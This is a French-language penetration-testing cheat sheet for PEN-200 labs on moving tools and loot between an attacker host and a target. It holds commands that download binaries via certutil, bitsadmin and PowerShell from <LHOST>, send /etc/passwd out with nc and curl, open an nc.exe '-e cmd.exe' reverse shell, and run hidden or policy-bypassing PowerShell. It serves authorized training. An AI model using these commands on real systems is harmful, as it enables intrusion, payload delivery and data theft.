# Annexe — File Transfers

> Module retiré du syllabus PEN-200 en 2023 (couvert par PEN-100), mais **indispensable** en labs et en examen : sans transfert, pas de winPEAS, pas de chisel, pas de payload.

---

## 1. Depuis l'attaquant vers la cible

### HTTP (le plus universel)
```bash
# Serveur
cd /opt/tools && python3 -m http.server 80
# ou
python3 -m http.server 8000 --directory /opt/tools
```

```bash
# Linux cible
wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh
curl -s http://<LHOST>/linpeas.sh -o /tmp/linpeas.sh
curl http://<LHOST>/file.tar.gz | tar xz -C /tmp
```

```powershell
# Windows cible
powershell -c "Invoke-WebRequest -Uri http://<LHOST>/winPEASx64.exe -OutFile C:\Temp\wp.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<LHOST>/nc.exe','C:\Temp\nc.exe')"
certutil -urlcache -split -f http://<LHOST>/nc.exe C:\Temp\nc.exe
bitsadmin /transfer job http://<LHOST>/nc.exe C:\Temp\nc.exe
```

```cmd
:: Windows sans PowerShell (LOLBins)
certutil -urlcache -f http://<LHOST>/file.exe C:\Temp\file.exe
```

### SMB
```bash
# Serveur SMB (attaquant)
impacket-smbserver share /opt/tools -smb2support
impacket-smbserver share /opt/tools -smb2support -username user -password pass
```

```cmd
:: Cible Windows
copy \\<LHOST>\share\nc.exe C:\Temp\nc.exe
:: Directement depuis le partage
\\<LHOST>\share\nc.exe -e cmd.exe <LHOST> 4444
```

```bash
# SMB client Linux
smbclient //<LHOST>/share -N -c "get file.exe"
```

> Certains Windows refusent l'accès anonyme aux partages SMB → ajouter `-username`/`-password`.

### FTP / TFTP
```bash
# Serveur FTP rapide
python3 -m pyftpdlib -p 21 -w
# TFTP (Windows a un client tftp natif)
sudo atftpd --daemon --port 69 /opt/tools
```
```cmd
tftp -i <LHOST> GET file.exe C:\Temp\file.exe
```

### Netcat
```bash
# Attaquant : envoi
nc -lvnp 4444 < file.exe
# Cible : réception
nc <LHOST> 4444 > file.exe
```

```bash
# Cible Linux sans nc : bash /dev/tcp
cat < /dev/tcp/<LHOST>/4444 > file.exe
```

### Base64 (sans réseau sortant)
```bash
# Attaquant
base64 -w0 file.exe
# Cible
echo '<BASE64>' | base64 -d > file.exe
```
```powershell
[IO.File]::WriteAllBytes("C:\Temp\file.exe",[Convert]::FromBase64String("<BASE64>"))
```

Taille limitée par le terminal (~ quelques centaines de Ko). Découper :
```bash
split -b 100k file.exe part_
```

---

## 2. Depuis la cible vers l'attaquant

```bash
# Listener
nc -lvnp 9001 > loot.zip
```
```bash
# Cible Linux
nc <LHOST> 9001 < /etc/passwd
curl -X POST --data-binary @/etc/passwd http://<LHOST>:8000/upload
```
```powershell
# Cible Windows
powershell -c "Invoke-WebRequest -Uri http://<LHOST>:8000/ -Method POST -InFile C:\Temp\loot.zip"
```

```bash
# Serveur de réception (si POST)
python3 -m http.server 8000   # ne gère pas POST → préférer :
pip install uploadserver && python3 -m uploadserver 8000
```

```bash
# SMB inverse
impacket-smbserver share /tmp/loot -smb2support
# Windows : copy C:\Temp\loot.zip \\<LHOST>\share\
```

```bash
# Exfiltration DNS (si tout est bloqué)
# encoder en base64 et résoudre <data>.<DOMAIN>
```

---

## 3. Cas particuliers

### Binaire sans droit d'exécution
```bash
chmod +x file
# Si /tmp monté noexec
cp file /dev/shm/ && chmod +x /dev/shm/file
```

### Windows : exécution depuis un partage
```cmd
\\<LHOST>\share\tool.exe
```
Souvent bloqué par Defender (Mark-of-the-Web absent, mais exécution réseau restreinte).

### PowerShell restreint
```powershell
powershell -ep bypass -c "..."
powershell -nop -w hidden -c "..."
```
```cmd
:: Si PowerShell bloqué par GPO
certutil -urlcache -f ...
```

### Transfert de plusieurs fichiers
```bash
tar czf tools.tar.gz linpeas.sh chisel pspy64
# puis un seul transfert + extraction
```
```powershell
Expand-Archive C:\Temp\tools.zip -DestinationPath C:\Temp
```

---

## 4. Télécharger un binaire quand tout est filtré

| Restriction | Solution |
|---|---|
| HTTP sortant bloqué | DNS (dnscat2), ICMP |
| Exécution bloquée dans `/tmp` | `/dev/shm`, `/var/tmp`, home |
| Pas de `wget`/`curl` | `bash /dev/tcp`, `python3 urllib`, `perl` |
| Pas de PowerShell | `certutil`, `bitsadmin`, `mshta` |
| SMB bloqué | HTTP sur 80/443 |
| AV supprime le binaire | renommer + base64, ou exécution en mémoire |

```bash
# Sans wget ni curl (Linux)
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<LHOST>/x','/tmp/x')"
perl -e 'use LWP::Simple;getstore("http://<LHOST>/x","/tmp/x")'
exec 3<>/dev/tcp/<LHOST>/80; echo -e "GET /x HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/x
```

---

## 5. Vérifications

```bash
# Intégrité
sha256sum file            # des deux côtés
```
```powershell
Get-FileHash C:\Temp\file.exe -Algorithm SHA256
```

```bash
# Le binaire est-il exécutable / bonne architecture ?
file file
uname -m                  # x86_64 / aarch64
```
```cmd
:: Windows
wmic os get osarchitecture
```

---

## 6. Pièges

| Piège | Conséquence |
|---|---|
| Transférer en texte (ASCII) | binaire corrompu |
| Oublier `chmod +x` | « permission denied » |
| `/tmp` en noexec | exécution impossible |
| Pare-feu sortant | HTTP sur 80/443 plutôt que 4444 |
| Base64 tronqué par le terminal | fichier invalide |
| Nonces/quotes PowerShell | commande cassée |
| SMB anonyme refusé | ajouter des creds |

---

## 7. Checklist

- [ ] Méthode choisie selon les ports sortants autorisés
- [ ] Serveur lancé (HTTP/SMB/FTP)
- [ ] Fichier transféré et hash vérifié
- [ ] Permissions d'exécution
- [ ] Emplacement exécutable (pas `noexec`)
- [ ] Nettoyage des fichiers laissés sur la cible en fin de test
